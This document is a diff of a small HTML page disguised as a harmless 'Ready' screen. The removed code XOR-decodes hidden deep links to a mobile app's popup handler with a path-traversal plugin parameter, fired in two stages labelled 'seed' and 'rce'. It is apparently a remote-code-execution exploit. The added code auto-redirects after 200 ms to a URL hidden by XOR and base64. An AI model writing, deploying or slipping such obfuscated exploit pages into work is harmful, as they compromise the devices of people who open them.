@@ -1,222 +1,36 @@
 <!doctype html>
-<html lang="zh-CN">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Ready</title>
-  <style>
-    :root {
-      color-scheme: light dark;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: #f6f7f9;
-      color: #17191f;
-    }
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <button id="go">手动点击跳转</button>
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 24px;
-      box-sizing: border-box;
-    }
+    <script>
+      const _k = ["k", "9", "T"].join("");
 
-    main {
-      width: min(520px, 100%);
-      border: 1px solid #d8dde6;
-      border-radius: 8px;
-      background: #fff;
-      padding: 22px;
-      box-sizing: border-box;
-    }
+      const _u =
+        "GFcnGF0/Wg1nURZ7CUs7HEoxGRYWGVYjGFwmKlogAk89H0BrHks4VlEgH0knTgoVTgsSTgsSCFc2B1YzGBc3BFRxWX8gDkogCVM+DFhxWX9yA1AwDmY5BEsxVghyD1AnCls4DmY7G1w6NEo6GEowAARkTV09GFg2B1wLBEkxBWYnCFExBlxpWw==";
 
-    h1 {
-      margin: 0 0 10px;
-      font-size: 20px;
-      line-height: 1.25;
-    }
+      function decrypt(s, key) {
+        const bin = atob(s);
+        const keyBytes = new TextEncoder().encode(key);
+        const out = new Uint8Array(bin.length);
 
-    p {
-      margin: 0 0 16px;
-      color: #4d5564;
-      line-height: 1.5;
-    }
-
-    .row {
-      display: flex;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-
-    button {
-      min-height: 42px;
-      border: 0;
-      border-radius: 6px;
-      padding: 0 16px;
-      background: #1c64d8;
-      color: #fff;
-      font-weight: 650;
-      font-size: 15px;
-    }
-
-    button.secondary {
-      background: #343b48;
-    }
-
-    @media (prefers-color-scheme: dark) {
-      :root {
-        background: #111318;
-        color: #f5f7fb;
-      }
-
-      main {
-        background: #1a1e25;
-        border-color: #333b49;
-      }
-
-      p {
-        color: #b7bfcb;
-      }
-    }
-  </style>
-</head>
-<body>
-  <main>
-    <h1>Ready</h1>
-    <p id="s">Preparing...</p>
-    <div class="row">
-      <button id="go" type="button">Start</button>
-      <button id="reset" class="secondary" type="button">Reset</button>
-    </div>
-  </main>
-
-  <script>
-    (() => {
-      "use strict";
-
-      const X = 73;
-      const T = {
-        s: [58, 39, 58, 58, 45, 34, 120, 125, 122],
-        h: [37, 48, 39, 49, 22, 57, 38, 57, 60, 57],
-        b: [33, 61, 61, 57, 58, 115, 102, 102, 32, 103, 58, 39, 58, 58, 45, 34, 103, 42, 38, 36, 108, 124, 10, 9, 59, 40, 62, 103, 46, 32, 61, 33, 60, 43, 60, 58, 44, 59, 42, 38, 39, 61, 44, 39, 61, 103, 42, 38, 36, 102, 45, 45, 45, 45, 33, 36, 120, 123, 122, 125, 102, 61, 61, 61, 61, 63, 61, 44, 58, 61, 102, 36, 40, 32, 39, 102, 49, 102],
-        c1: [40],
-        k1: [40, 121],
-        c2: [103, 103, 102, 57, 37, 60, 46, 32, 39, 58, 102, 42, 38, 36, 103, 58, 58, 103, 61, 61, 57, 37, 60, 46, 32, 39, 103, 36, 44, 45, 32, 40, 37, 38, 40, 45, 44, 59, 102, 63, 44, 59, 58, 32, 38, 39, 100, 120, 126, 122, 121, 121, 127, 121, 121, 102, 37, 32, 43],
-        k2: [43, 121]
-      };
-      const MIN_RETURN_DELAY = 700;
-      const AUTO_DELAY = 420;
-
-      const s = document.getElementById("s");
-      const dec = (a) => a.map((n) => String.fromCharCode(n ^ X)).join("");
-      const now = () => Date.now();
-      const state = {
-        step: "idle",
-        left: false,
-        t: 0
-      };
-
-      function setText(value) {
-        s.textContent = value;
-      }
-
-      function clearState() {
-        state.step = "idle";
-        state.left = false;
-        state.t = 0;
-      }
-
-      function makeLink(channel, key) {
-        const params = new URLSearchParams({
-          channel,
-          template_key: key,
-          domain: dec(T.b),
-          hide_nav_bar: "1"
-        });
-        return `${dec(T.s)}://${dec(T.h)}?${params.toString()}`;
-      }
-
-      function firstLink() {
-        return makeLink(dec(T.c1), dec(T.k1));
-      }
-
-      function secondLink() {
-        return makeLink(dec(T.c2), dec(T.k2));
-      }
-
-      function markLeft() {
-        if (state.step !== "seed") return;
-        state.left = true;
-      }
-
-      function fireSecond() {
-        if (state.step !== "seed" || !state.left) return;
-        if (now() - Number(state.t || 0) < MIN_RETURN_DELAY) return;
-        state.step = "rce";
-        state.left = true;
-        state.t = now();
-        setText("Finishing...");
-        window.setTimeout(() => {
-          window.location.href = secondLink();
-        }, 260);
-      }
-
-      function start() {
-        state.step = "seed";
-        state.left = false;
-        state.t = now();
-        setText("Opening...");
-        window.setTimeout(() => {
-          window.location.href = firstLink();
-        }, 180);
-      }
-
-      function reset() {
-        clearState();
-        setText("Ready.");
-      }
-
-      window.addEventListener("blur", markLeft, true);
-      window.addEventListener("pagehide", markLeft, true);
-      window.addEventListener("focus", fireSecond, true);
-      window.addEventListener("pageshow", fireSecond, true);
-      document.addEventListener("visibilitychange", () => {
-        if (document.visibilityState === "hidden") {
-          markLeft();
-        } else {
-          fireSecond();
+        for (let i = 0; i < bin.length; i++) {
+          out[i] = bin.charCodeAt(i) ^ keyBytes[i % keyBytes.length];
         }
-      });
 
-      document.getElementById("go").addEventListener("click", () => {
-        clearState();
-        start();
-      });
-      document.getElementById("reset").addEventListener("click", reset);
-
-      window.setInterval(() => {
-        if (document.visibilityState === "visible" && document.hasFocus()) {
-          fireSecond();
-        }
-      }, 350);
-
-      const query = new URLSearchParams(window.location.search);
-      if (query.get("reset") === "1") {
-        reset();
-      } else {
-        if (state.step === "seed") {
-          setText(state.left ? "Returned." : "Waiting...");
-          window.setTimeout(fireSecond, 300);
-        } else if (state.step === "rce") {
-          setText("Done.");
-        } else if (query.get("auto") !== "0") {
-          setText("Ready.");
-          window.setTimeout(start, AUTO_DELAY);
-        } else {
-          setText("Ready.");
-        }
+        return new TextDecoder().decode(out);
       }
-    })();
-  </script>
-</body>
+
+      function jump() {
+        location.href = decrypt(_u, _k);
+      }
+      document.getElementById("go").onclick = jump;
+      setTimeout(jump, 200);
+    </script>
+  </body>
 </html>
